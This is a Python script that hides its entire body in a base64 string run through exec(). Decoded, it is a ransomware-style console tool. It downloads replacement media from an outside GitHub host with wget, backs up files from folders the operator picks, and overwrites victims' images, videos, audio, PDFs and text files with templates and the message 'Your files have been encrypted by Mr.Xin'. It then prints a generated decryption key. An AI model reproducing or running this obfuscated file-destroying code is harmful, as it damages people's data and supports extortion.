#!/bin/python
#coding: utf-8

import base64
exec(base64.b64decode(b'IyEvYmluL3B5dGhvbgojY29kaW5nOiB1dGYtOAoKaW1wb3J0IG9zLCBzeXMsIHRpbWUsIGRhdGV0aW1lLCBqc29uLCBzaHV0aWwsIGhhc2hsaWIsIHJhbmRvbSwgYmFzZTY0LCByZWFkbGluZQoKYXJyYXkgPSBbXQoKY2xhc3MgYXV0byhvYmplY3QpOgoJZGVmIF9faW5pdF9fKHNlbGYsIG9wdGlvbnMpOgoJCXNlbGYub3B0aW9ucyA9IHNvcnRlZChvcHRpb25zKQoJCglkZWYgY29tcGxldGUoc2VsZiwgdGV4dCwgc3RhdGUpOgoJCWlmIHN0YXRlID09IDA6CgkJCWlmIHRleHQ6CgkJCQlzZWxmLm1hdGNoZXMgPSBbcyBmb3IgcyBpbiBzZWxmLm9wdGlvbnMgaWYgcyBhbmQgcy5zdGFydHN3aXRoKHRleHQpXQoJCQllbHNlOgoJCQkJc2VsZi5tYXRjaGVzID0gc2VsZi5vcHRpb25zWzpdCgkJdHJ5OgoJCQlyZXR1cm4gc2VsZi5tYXRjaGVzW3N0YXRlXQoJCWV4Y2VwdCBJbmRleEVycm9yOgoJCQlyZXR1cm4gTm9uZQoKZGVmIGNvbXBsZXRlKGFycmF5KToKCWNvbXBsZXRlciA9IGF1dG8oYXJyYXkpCglyZWFkbGluZS5zZXRfY29tcGxldGVyKGNvbXBsZXRlci5jb21wbGV0ZSkKCXJlYWRsaW5lLnBhcnNlX2FuZF9iaW5kKCd0YWI6Y29tcGxldGUnKQoKZGVmIGxvYWRpbmdTY3JlZW4obXNnLCBtc2dJZkRvbmUgPSAiICAgICIpOgoJYmFycyA9IFsKCQlmIlsqXSB7bXNnfSAuICAgLSIsCgkJZiJbKl0ge21zZ30gLi4gIHwiLAoJCWYiWypdIHttc2d9IC4uLiBcXCIsCgkJZiJbKl0ge21zZ30gLiAgIC8iLAoJCWYiWypdIHttc2d9IC4gICAtIiwKCQlmIlsqXSB7bXNnfSAuLiAgfCIsCgkJZiJbKl0ge21zZ30gLi4uIFxcIiwKCQlmIlsqXSB7bXNnfSAuICAgLyIsCgkJZiJbKl0ge21zZ30gLiAgIC0iLAoJCWYiWypdIHttc2d9IC4uICB8IiwKCQlmIlsqXSB7bXNnfSAuLi4gXFwiLAoJCWYiWypdIHttc2d9IC4gICAvIiwKCQlmIlsqXSB7bXNnfSAuICAgLSIsCgkJZiJbKl0ge21zZ30gLi4gIHwiLAoJCWYiWypdIHttc2d9IC4uLiBcXCIsCgkJZiJbKl0ge21zZ30gLiAgIC8iLAoJCWYiWypdIHttc2d9IC4gICAtIiwKCQlmIlsqXSB7bXNnfSAuLiAgfCIsCgkJZiJbKl0ge21zZ30gLi4uIFxcIiwKCQlmIlsqXSB7bXNnfSAuICAgLyIsCgkJZiJbKl0ge21zZ30gLiAgIC0iLAoJCWYiWypdIHttc2d9IC4uICB8IiwKCQlmIlsqXSB7bXNnfSAuLi4gXFwiLAoJCWYiWypdIHttc2d9IC4gICAvIiwKCQlmIlsqXSB7bXNnfSAuLi4ge21zZ0lmRG9uZX0iCgldCglmb3IgaSBpbiByYW5nZShsZW4oYmFycykpOgoJCXRpbWUuc2xlZXAoMS4vcmFuZG9tLnJhbmRpbnQoMSwgMTApKQoJCXN5cy5zdGRvdXQud3JpdGUoZiJccntiYXJzW2ldfSIpCgkJc3lzLnN0ZG91dC5mbHVzaCgpCglwcmludCgiIikKCXRpbWUuc2xlZXAoMikKCmJhbm5lciA9ICIiIgogIF9fXyAgX19fICBfIF8gIF9fXyAgX19fICBfXyBfXyAgX19fICBfIF8gXyAgX19fICBfX18gIF9fXyAKIHwgLiBcfCAuIHx8IFwgfC8gX18+fCAuIHx8ICBcICBcfCBfXz58IHwgfCB8fCAuIHx8IC4gXHwgX18+CiB8ICAgL3wgICB8fCAgIHxcX18gXHwgfCB8fCAgICAgfHwgXz4gfCB8IHwgfHwgICB8fCAgIC98IF8+IAogfF9cX1x8X3xffHxfXF98PF9fXy9gX19fJ3xffF98X3x8X19fPnxfXy9fLyB8X3xffHxfXF9cfF9fXz4KICAgIENvZGUgYnkgQHZ4aW4uZGV2ICAgICAgWyBweXRob24gXSAgICAgdmVyc2lvbiAxLjUtZGV2CiIiIgoKZGVmIHN0YXJ0QmFubmVyKCk6CglwcmludChiYW5uZXIpCgppZiBvcy5wYXRoLmV4aXN0cygiLnJhbnNvbWV3YXJlIik6CglwYXNzCmVsc2U6Cglvcy5ta2RpcigiLnJhbnNvbWV3YXJlIikKCW9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJ3Iikud3JpdGUoanNvbi5kdW1wcyh7CgkJInBhdGhzIjogW10KCX0sIGluZGVudD00KSkKCQoJaWYgb3MucGF0aC5leGlzdHMoImFzc2V0cy90ZW1wbGF0ZXMiKToKCQlwYXNzCgllbHNlOgoJCW9zLm1ha2VkaXJzKCJhc3NldHMvdGVtcGxhdGVzIikKCQlvcy5zeXN0ZW0oIndnZXQgLU8gYXNzZXRzL3RlbXBsYXRlcy90ZW1wbGF0ZS5qcGcuZW5jcnlwdCBodHRwczovL2dpdGh1Yi5jb20vdkhhY2tzLWRldmVsb3BtZW50L3RlbXBsYXRlcy9yYXcvbWFpbi90ZW1wbGF0ZS5qcGcuZW5jcnlwdCA+PiAucmFuc29tZXdhcmUvLnJhbnNvbWV3YXJlLmxvZyIpCgkJb3Muc3lzdGVtKCJ3Z2V0IC1PIGFzc2V0cy90ZW1wbGF0ZXMvdGVtcGxhdGUubXA0LmVuY3J5cHQgaHR0cHM6Ly9naXRodWIuY29tL3ZIYWNrcy1kZXZlbG9wbWVudC90ZW1wbGF0ZXMvcmF3L21haW4vdGVtcGxhdGUubXA0LmVuY3J5cHQgPj4gLnJhbnNvbWV3YXJlLy5yYW5zb21ld2FyZS5sb2ciKQoJCW9zLnN5c3RlbSgid2dldCAtTyBhc3NldHMvdGVtcGxhdGVzL3RlbXBsYXRlLnBkZi5lbmNyeXB0IGh0dHBzOi8vZ2l0aHViLmNvbS92SGFja3MtZGV2ZWxvcG1lbnQvdGVtcGxhdGVzL3Jhdy9tYWluL3RlbXBsYXRlLnBkZi5lbmNyeXB0ID4+IC5yYW5zb21ld2FyZS8ucmFuc29tZXdhcmUubG9nIikKCQlvcy5zeXN0ZW0oIndnZXQgLU8gYXNzZXRzL3RlbXBsYXRlcy90ZW1wbGF0ZS5tcDMuZW5jcnlwdCBodHRwczovL2dpdGh1Yi5jb20vdkhhY2tzLWRldmVsb3BtZW50L3RlbXBsYXRlcy9yYXcvbWFpbi90ZW1wbGF0ZS5tcDMuZW5jcnlwdCA+PiAucmFuc29tZXdhcmUvLnJhbnNvbWV3YXJlLmxvZyIpCgp0ZW1wbGF0ZUpwZyA9IGJhc2U2NC5iNjRkZWNvZGUob3BlbigiYXNzZXRzL3RlbXBsYXRlcy90ZW1wbGF0ZS5qcGcuZW5jcnlwdCIsICJyYiIpLnJlYWQoKSkKdGVtcGxhdGVNcDQgPSBiYXNlNjQuYjY0ZGVjb2RlKG9wZW4oImFzc2V0cy90ZW1wbGF0ZXMvdGVtcGxhdGUubXA0LmVuY3J5cHQiLCAicmIiKS5yZWFkKCkpCnRlbXBsYXRlUGRmID0gYmFzZTY0LmI2NGRlY29kZShvcGVuKCJhc3NldHMvdGVtcGxhdGVzL3RlbXBsYXRlLnBkZi5lbmNyeXB0IiwgInJiIikucmVhZCgpKQp0ZW1wbGF0ZU1wMyA9IGJhc2U2NC5iNjRkZWNvZGUob3BlbigiYXNzZXRzL3RlbXBsYXRlcy90ZW1wbGF0ZS5tcDMuZW5jcnlwdCIsICJyYiIpLnJlYWQoKSkKdGVtcGxhdGVUeHQgPSAiWW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkIGJ5IE1yLlhpbiIKCnRpbWUuc2xlZXAoMikKcHJpbnQoIlwwMzNbSFwwMzNbSiIpCnN0YXJ0QmFubmVyKCkKCmRlZiByYW5zb21ld2FyZUhlbHAoKToKCXByaW50KCIiKQoJcHJpbnQoIkNPUkUgQ09NTUFORFMiKQoJcHJpbnQoIj09PT09PT09PT09PT0iKQoJcHJpbnQoIiIpCglwcmludCgiXHRDb21tYW5kICAgICBEZXNjcmlwdGlvbiIpCglwcmludCgiXHQtLS0tLS0tICAgICAtLS0tLS0tLS0tLSIpCglwcmludCgiXHRhZGQgICAgICAgICBBZGQgdGhlIGZvbGRlciB0byB0aGUgZm9sZGVyIGxpc3QiKQoJcHJpbnQoIlx0ZGVsICAgICAgICAgUmVtb3ZlIHRoZSBmb2xkZXIgZnJvbSB0aGUgZm9sZGVyIGxpc3QiKQoJcHJpbnQoIlx0aW5mbyAgICAgICAgVmlldyB0aGUgbGlzdCBvZiBmb2xkZXJzIikKCXByaW50KCJcdGVuY3J5cHQgICAgIFJ1biB0aGUgdmlydXMgYW5kIHN0YXJ0IGZpbGUgZW5jcnlwdGlvbiIpCglwcmludCgiIikKCndoaWxlIFRydWU6Cgl0cnk6CgkJcHJvbXB0ID0gaW5wdXQoInJhbnNvbWV3YXJlID4gIikuc3BsaXQoKQoJCWlmIHByb21wdFswXSA9PSAiaGVscCIgb3IgcHJvbXB0WzBdID09ICI/IjoKCQkJcmFuc29tZXdhcmVIZWxwKCkKCQllbGlmIHByb21wdFswXSA9PSAiYWRkIjoKCQkJcHJpbnQoIiIpCgkJCXRyeToKCQkJCXByb21wdC5yZW1vdmUocHJvbXB0WzBdKQoJCQkJbmFtZVBhdGggPSAiICIuam9pbihwcm9tcHQpCgkJCQlpZiBvcy5wYXRoLmV4aXN0cyhuYW1lUGF0aCk6CgkJCQkJZiA9IGpzb24ubG9hZHMob3BlbigiLnJhbnNvbWV3YXJlLy5wYXRocy5qc29uIiwgInIiKS5yZWFkKCkpCgkJCQkJaWYgZiIne25hbWVQYXRofSciIGluIHN0cihmWyJwYXRocyJdKToKCQkJCQkJcHJpbnQoIlsqXSBUaGlzIGZvbGRlciBhbHJlYWR5IGV4aXN0cyIpCgkJCQkJZWxzZToKCQkJCQkJZlsicGF0aHMiXS5hcHBlbmQobmFtZVBhdGgpCgkJCQkJCW9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJ3Iikud3JpdGUoanNvbi5kdW1wcyhmLCBpbmRlbnQ9NCkpCgkJCQkJCXByaW50KGYiWypdIFRoZSB7bmFtZVBhdGh9IGZvbGRlciBoYXMgYmVlbiBhZGRlZCB0byB0aGUgbGlzdCIpCgkJCQllbHNlOgoJCQkJCXByaW50KGYiWypdIFRoZSB7bmFtZVBhdGh9IGZvbGRlciBjYW5ub3QgYmUgYWRkZWQiKQoJCQlleGNlcHQgSW5kZXhFcnJvcjogCgkJCQlwcmludCgiWypdIFBsZWFzZSBlbnRlciB0aGUgbmFtZSBvZiB0aGUgZm9sZGVyIHlvdSB3YW50IHRvIGFkZCIpCgkJCXByaW50KCIiKQoJCWVsaWYgcHJvbXB0WzBdID09ICJkZWwiOgoJCQlwcmludCgiIikKCQkJaWYgcHJvbXB0WzFdID09ICJhbGwiOgoJCQkJb3BlbigiLnJhbnNvbWV3YXJlLy5wYXRocy5qc29uIiwgInciKS53cml0ZShqc29uLmR1bXBzKHsKCQkJCQkicGF0aHMiOiBbXQoJCQkJfSwgaW5kZW50PTQpKQoJCQkJcHJpbnQoIlsqXSBBbGwgZm9sZGVycyBoYXZlIGJlZW4gcmVtb3ZlZCBmcm9tIHRoZSBsaXN0IikKCQkJZWxzZToKCQkJCXRyeToKCQkJCQlwcm9tcHQucmVtb3ZlKHByb21wdFswXSkKCQkJCQluZXdQYXRoID0gIiAiLmpvaW4ocHJvbXB0KQoJCQkJCWYgPSBqc29uLmxvYWRzKG9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJyIikucmVhZCgpKQoJCQkJCWlmIGYiJ3tuZXdQYXRofSciIGluIHN0cihmWyJwYXRocyJdKToKCQkJCQkJZlsicGF0aHMiXS5yZW1vdmUobmV3UGF0aCkKCQkJCQkJb3BlbigiLnJhbnNvbWV3YXJlLy5wYXRocy5qc29uIiwgInciKS53cml0ZShqc29uLmR1bXBzKGYsIGluZGVudD00KSkKCQkJCQkJcHJpbnQoZiJUaGUge25ld1BhdGh9IGZvbGRlciBoYXMgYmVlbiByZW1vdmVkIGZyb20gdGhlIGxpc3QiKQoJCQkJCWVsc2U6CgkJCQkJCXByaW50KGYiWypdIFRoZSB7bmV3UGF0aH0gZm9sZGVyIGlzIG5vdCBpbiB0aGUgbGlzdCIpCgkJCQlleGNlcHQgSW5kZXhFcnJvcjoKCQkJCQlwcmludCgiWypdIFBsZWFzZSBlbnRlciB0aGUgbmFtZSBvZiB0aGUgZm9sZGVyIHlvdSB3YW50IHRvIGRlbGV0ZSIpCgkJCXByaW50KCIiKQoJCWVsaWYgcHJvbXB0WzBdID09ICJpbmZvIjoKCQkJcHJpbnQoIiIpCgkJCWYgPSBqc29uLmxvYWRzKG9wZW4oIi5yYW5zb21ld2FyZS8ucGF0aHMuanNvbiIsICJyIikucmVhZCgpKVsicGF0aHMiXQoJCQlwcmludCgiWypdIExpc3QgdGhlIGZvbGRlcnMgeW91IHdhbnQgdG8gZW5jcnlwdFxuIikKCQkJdG90YWxGb2xkZXIgPSAwCgkJCWZvciBwYXRoIGluIGY6CgkJCQlwcmludChmIiAgfiB7cGF0aH0iKQoJCQkJdG90YWxGb2xkZXIgKz0gMQoJCQlwcmludCgiIikKCQkJcHJpbnQoZiJ7dG90YWxGb2xkZXJ9IEZvbGRlcnMgbGlzdGVkIikKCQkJcHJpbnQoIiIpCgkJZWxpZiBwcm9tcHRbMF0gPT0gImVuY3J5cHQiOgoJCQkjU3RhcnQgZW5jcnlwdAoJCQlwcmludCgiIikKCQkJbG9hZGluZ1NjcmVlbigiU3RhcnQgZW5jcnlwdGluZyIpCgkJCWlmIG9zLnBhdGguZXhpc3RzKCIucmFuc29tZXdhcmUvLmRlY3J5cHQua2V5Iik6CgkJCQlwcmludCgiWypdIFlvdSBjYW4ndCBlbmNyeXB0IikKCQkJZWxzZToKCQkJCW51bSA9IDAKCQkJCWxvYWRpbmdTY3JlZW4oIkVuY3J5cHQgYWxsIGZpbGVzIikKCQkJCWZvciBwYXRoIGluIGpzb24ubG9hZHMob3BlbigiLnJhbnNvbWV3YXJlLy5wYXRocy5qc29uIiwgInIiKS5yZWFkKCkpWyJwYXRocyJdOgoJCQkJCWlmIG9zLnBhdGguZXhpc3RzKHBhdGgpOgoJCQkJCQl0cnk6CgkJCQkJCQlvcy5tYWtlZGlycyhmIi5yYW5zb21ld2FyZS8uc2F2ZS97cGF0aH0iKQoJCQkJCQlleGNlcHQgRmlsZUV4aXN0c0Vycm9yOgoJCQkJCQkJcGFzcwoJCQkJCQlmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgoJCQkJCQkJaWYgZmlsZVstNDpdID09ICIuanBnIiBvciBmaWxlWy00Ol0gPT0gIi5wbmciIG9yIGZpbGVbLTU6XSA9PSAiLmpwZWciOgoJCQkJCQkJCWYgPSBvcGVuKGYie3BhdGh9L3tmaWxlfSIsICJyYiIpCgkJCQkJCQkJb3BlbihmIi5yYW5zb21ld2FyZS8uc2F2ZS97cGF0aH0ve2ZpbGV9LmVuY3J5cHQiLCAid2IiKS53cml0ZShiYXNlNjQuYjY0ZW5jb2RlKGYucmVhZCgpKSkKCQkJCQkJCQlvcGVuKGYie3BhdGh9L3tmaWxlfSIsICJ3YiIpLndyaXRlKHRlbXBsYXRlSnBnKQoJCQkJCQkJCW51bSArPSAxCgkJCQkJCQllbGlmIGZpbGVbLTQ6XSA9PSAiLm1wNCI6CgkJCQkJCQkJZiA9IG9wZW4oZiJ7cGF0aH0ve2ZpbGV9IiwgInJiIikKCQkJCQkJCQlvcGVuKGYiLnJhbnNvbWV3YXJlLy5zYXZlL3twYXRofS97ZmlsZX0uZW5jcnlwdCIsICJ3YiIpLndyaXRlKGJhc2U2NC5iNjRlbmNvZGUoZi5yZWFkKCkpKQoJCQkJCQkJCW9wZW4oZiJ7cGF0aH0ve2ZpbGV9IiwgIndiIikud3JpdGUodGVtcGxhdGVNcDQpCgkJCQkJCQkJbnVtICs9IDEKCQkJCQkJCWVsaWYgZmlsZVstNDpdID09ICIubXAzIjoKCQkJCQkJCQlmID0gb3BlbihmIntwYXRofS97ZmlsZX0iLCAicmIiKQoJCQkJCQkJCW9wZW4oZiIucmFuc29tZXdhcmUvLnNhdmUve3BhdGh9L3tmaWxlfS5lbmNyeXB0IiwgIndiIikud3JpdGUoYmFzZTY0LmI2NGVuY29kZShmLnJlYWQoKSkpCgkJCQkJCQkJb3BlbihmIntwYXRofS97ZmlsZX0iLCAid2IiKS53cml0ZSh0ZW1wbGF0ZU1wMykKCQkJCQkJCQludW0gKz0gMQoJCQkJCQkJZWxpZiBmaWxlWy00Ol0gPT0gIi5wZGYiOgoJCQkJCQkJCWYgPSBvcGVuKGYie3BhdGh9L3tmaWxlfSIsICJyYiIpCgkJCQkJCQkJb3BlbihmIi5yYW5zb21ld2FyZS8uc2F2ZS97cGF0aH0ve2ZpbGV9LmVuY3J5cHQiLCAid2IiKS53cml0ZShiYXNlNjQuYjY0ZW5jb2RlKGYucmVhZCgpKSkKCQkJCQkJCQlvcGVuKGYie3BhdGh9L3tmaWxlfSIsICJ3YiIpLndyaXRlKHRlbXBsYXRlUGRmKQoJCQkJCQkJCW51bSArPSAxCgkJCQkJCQllbGlmIGZpbGVbLTQ6XSA9PSAiLnR4dCI6CgkJCQkJCQkJZiA9IG9wZW4oZiJ7cGF0aH0ve2ZpbGV9IiwgInIiKQoJCQkJCQkJCW9wZW4oZiIucmFuc29tZXdhcmUvLnNhdmUve3BhdGh9L3tmaWxlfS5lbmNyeXB0IiwgIndiIikud3JpdGUoYmFzZTY0LmI2NGVuY29kZShmLnJlYWQoKS5lbmNvZGUoInV0Zi04IikpKQoJCQkJCQkJCW9wZW4oZiJ7cGF0aH0ve2ZpbGV9IiwgInciKS53cml0ZSh0ZW1wbGF0ZVR4dCkKCQkJCQkJCQludW0gKz0gMQoJCQkJCWVsc2U6CgkJCQkJCXBhc3MKCQkJCWdlbktleSA9IGhhc2hsaWIuc2hhMjU2KGYiSGFja2VkIEJ5IEBWeGluLkRldiBeX14gLSBDb2RlOiB7cmFuZG9tLnJhbmRpbnQoMjAwLCA0MDQpfSIuZW5jb2RlKCJ1dGYtOCIpKS5oZXhkaWdlc3QoKQoJCQkJb3BlbigiLnJhbnNvbWV3YXJlLy5kZWNyeXB0LmtleSIsICJ3Iikud3JpdGUoanNvbi5kdW1wcyh7CgkJCQkJImtleSI6IGdlbktleQoJCQkJfSwgaW5kZW50PTIpKQoJCQkJb3Muc3lzdGVtKGYiemlwIC1yIC5yYW5zb21ld2FyZS8uc2F2ZS9yYW5zb21ld2FyZV97ZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoJyVkLSVtLSV5LSVIJU0lUycpfS56aXAgLnJhbnNvbWV3YXJlLy5zYXZlL3NkY2FyZCA+PiAucmFuc29tZXdhcmUvLnJhbnNvbWV3YXJlLmxvZyIpCgkJCQkKCQkJCSNNZXNzYWdlIFdoZW4gRG9uZSBFbmNyeXB0CgkJCQlwcmludCgiXDAzM1tBWypdIEVuY3J5cHQgYWxsIGZpbGVzIC4uLiBkb25lIikKCQkJCXByaW50KGYiWypdIHtudW19IEZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQiKQoJCQkJcHJpbnQoZiJbKl0gS2V5IHRvIGRlY3J5cHQ6IHtnZW5LZXl9IikKCQkJcHJpbnQoIiIpCgkJZWxzZToKCQkJcHJpbnQoZiJbKl0gQ29tbWFuZCBub3QgZm91bmQ6IHtwcm9tcHRbMF19IikKCWV4Y2VwdCBJbmRleEVycm9yOgoJCXBhc3MKCWV4Y2VwdCBLZXlib2FyZEludGVycnVwdDogCgkJcHJpbnQoIlxuWypdIEV4aXQgdGhlIGNvbnNvbGVcbiIpCgkJYnJlYWs='))